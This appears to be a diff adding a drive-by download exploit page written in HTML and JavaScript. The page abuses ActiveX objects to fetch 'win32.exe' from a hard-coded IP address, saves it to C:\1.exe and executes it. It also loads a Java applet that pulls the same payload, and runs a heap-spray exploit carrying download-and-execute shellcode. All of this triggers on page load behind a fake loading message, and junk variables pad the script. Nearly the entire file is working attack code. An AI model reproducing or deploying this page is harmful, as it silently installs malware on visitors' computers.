@@ -1,0 +1,172 @@
+<script language="javascript">
+function CreateO(o, n) {
+var r = null;
+try { eval('r = o.CreateObject(n)') }catch(e){}
+if (! r) {
+try { eval('r = o.CreateObject(n, "")') }catch(e){}
+}
+if (! r) {
+try { eval('r = o.CreateObject(n, "", "")') }catch(e){}
+}
+if (! r) {
+try { eval('r = o.GetObject("", n)') }catch(e){}
+}
+if (! r) {
+try { eval('r = o.GetObject(n, "")') }catch(e){}
+}
+if (! r) {
+try { eval('r = o.GetObject(n)') }catch(e){}
+}
+return(r);
+}
+
+function Go(a) {
+var obj_msxml1 = "CreateO(a, sdasaojdsajfdoifddiusfhsjdhfsdkhfsdkskjfsd.slas);";
+
+var obj_msxml2 = CreateO(a,"msxml2.XMLHTTP");
+obj_msxml2.open("GET","http://81.29.241.160/st/win32.exe?spl=rds",false);
+obj_msxml2.send();
+var kazanostra1 = "aaaaaaaaaaaas978423";
+var kazanostra2 = "aaaaaaaaaaaas978423";
+var kazanostra3 = "aaaaaaaaaaaas978423";
+var kazanostra4 = "aaaaaaaaaaaas978423";
+var kazanostra5 = "aaaaaaaaaaaas978423";
+var kazanostra6 = "aaaaaaaaaaaas978423";
+var obj_adodb = CreateO(a,"adodb.stream");
+obj_adodb.type = 1;
+obj_adodb.open();
+obj_adodb.Write(obj_msxml2.responseBody);
+var fn = "C:\\1.exe";
+obj_adodb.SaveToFile(fn,2);
+var s = CreateO(a, "Shell.Application");
+var kazanostra = "aaaaaaaaaaaas978423";
+s.ShellExecute(fn);
+return TRUE;
+}
+
+
+var i = 0;
+var t = new Array(
+'{BD96C556-65A3-11D0-983A-00C04FC29E30}',
+'{BD96C556-65A3-11D0-983A-00C04FC29E36}',
+'{AB9BCEDD-EC7E-47E1-9322-D4A210617116}',
+'{0006F033-0000-0000-C000-000000000046}',
+'{0006F03A-0000-0000-C000-000000000046}',
+'{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}',
+'{6414512B-B978-451D-A0D8-FCFDF33E833C}',
+'{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}',
+'{06723E09-F4C2-43c8-8358-09FCD1DB0766}',
+'{639F725F-1B2D-4831-A9FD-874847682010}',
+'{BA018599-1DB3-44f9-83B4-461454C84BF8}',
+'{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}',
+'{E8CCCDDF-CA28-496b-B050-6C07C962476B}',null);
+
+while (t[i]) {
+var a = null;
+var kazanostra31337 = "aaaaaaaaaaaas97842387897423b23jh4bkjfhkjebfkjerhfkejrhgkbjer";
+///////aaaaaaa09438280908923408924308923089230892092843089243089243089jwfwwekwek
+if (t[i].substring(0,1) == '{') {
+a = document.createElement("object");
+a.setAttribute("classid", "clsid:" + t[i].substring(1, t[i].length - 1));
+} else {
+try { a = new ActiveXObject(t[i]); } catch(e){}
+}
+
+if (a) {
+try {
+var b = CreateO(a, "Shell.Application");
+if (b) {
+if (Go(a)) break;
+}
+}catch(e){}
+}
+i++;
+}
+</script>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<body>
+<APPLET ARCHIVE="dat/count.jar" CODE="BlackBox.class" WIDTH=1 HEIGHT=1>
+<PARAM NAME="url" VALUE="http://81.29.241.160/st/win32.exe?spl=java"></APPLET>
+<object id=target classid="CLSID:{88d969c5-f192-11d4-a65f-0040963251e5}" >
+</object>
+<script>
+
+	function getSpraySlide(spraySlide, spraySlideSize)
+	{
+		while (spraySlide.length*2<spraySlideSize)
+		{
+			spraySlide += spraySlide;
+		}
+		spraySlide = spraySlide.substring(0,spraySlideSize/2);
+		return spraySlide;
+	}
+
+var url = http://81.29.241.160/st/win32.exe?spl=fi;
+var outValue = '';
+
+var obj = null;
+
+function exploit() {
+obj = document.getElementById('target').object;
+
+try {
+obj.open(new Array(),new Array(),new Array(),new Array(),new Array());
+} catch(e) {};
+
+for (i = 0; i < url.length; )
+{
+outValue += '%u' + ((i+1<url.length)?url.charCodeAt(i+1).toString(16):'00')+url.charCodeAt(i).toString(16);
+i = i + 2;
+}
+
+
+lipage = unescape(outValue);
+
+var heapSprayToAddress = 0x05050505;
+var payLoadCode = unescape("%u4343%u4343%u54EB%u758B%u8B3C%u3574%u0378"+
+                     "%u56F5%u768B%u0320%u33F5%u49C9%uAD41%uDB33"+
+                     "%u0F36%u14BE%u3828%u74F2%uC108%u0DCB%uDA03"+
+                     "%uEB40%u3BEF%u75DF%u5EE7%u5E8B%u0324%u66DD"+"%u0C8B%u8B4B%u1C5E%uDD03%u048B%u038B%uC3C5"+
+                     "%u7275%u6D6C%u6E6F%u642E%u6C6C%u4300%u5C3A"+
+                     "%u2e55%u7865%u0065%uC033%u0364%u3040%u0C78"+"%u408B%u8B0C%u1C70%u8BAD%u0840%u09EB%u408B"+
+                     "%u8D34%u7C40%u408B%u953C%u8EBF%u0E4E%uE8EC"+
+                     "%uFF84%uFFFF%uEC83%u8304%u242C%uFF3C%u95D0"+"%uBF50%u1A36%u702F%u6FE8%uFFFF%u8BFF%u2454"+
+                     "%u8DFC%uBA52%uDB33%u5353%uEB52%u5324%uD0FF"+
+                     "%uBF5D%uFE98%u0E8A%u53E8%uFFFF%u83FF%u04EC"+"%u2C83%u6224%uD0FF%u7EBF%uE2D8%uE873%uFF40"+
+                     "%uFFFF%uFF52%uE8D0%uFFD7%uFFFF");
+                     
+
+payLoadCode = payLoadCode +  lipage;
+
+var heapBlockSize = 0x400000;
+var payLoadSize = payLoadCode.length * 2;
+var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
+var spraySlide = unescape("%u0505%u0505");
+
+spraySlide = getSpraySlide(spraySlide,spraySlideSize);
+heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;
+memory = new Array();
+
+for (i=0;i<heapBlocks;i++)
+	{
+		memory[i] = spraySlide + payLoadCode;
+	}
+
+obj.open(new Object(),new Object(),new Object(),new Object(), new Object());
+obj.setRequestHeader(new Object(),'......');
+obj.setRequestHeader(new Object(),0x12345678);
+obj.setRequestHeader(new Object(),0x12345678);
+obj.setRequestHeader(new Object(),0x12345678);
+obj.setRequestHeader(new Object(),0x12345678);
+obj.setRequestHeader(new Object(),0x12345678);
+obj.setRequestHeader(new Object(),0x12345678);
+obj.setRequestHeader(new Object(),0x12345678);
+obj.setRequestHeader(new Object(),0x12345678);
+obj.setRequestHeader(new Object(),0x12345678);
+obj.setRequestHeader(new Object(),0x12345678);
+obj.setRequestHeader(new Object(),0x12345678);
+}
+</script>
+<body onLoad='setTimeout("exploit()", 4000);' value='Exploit'>
+<center>wait until page will be loaded.... 50%
+</body></html>
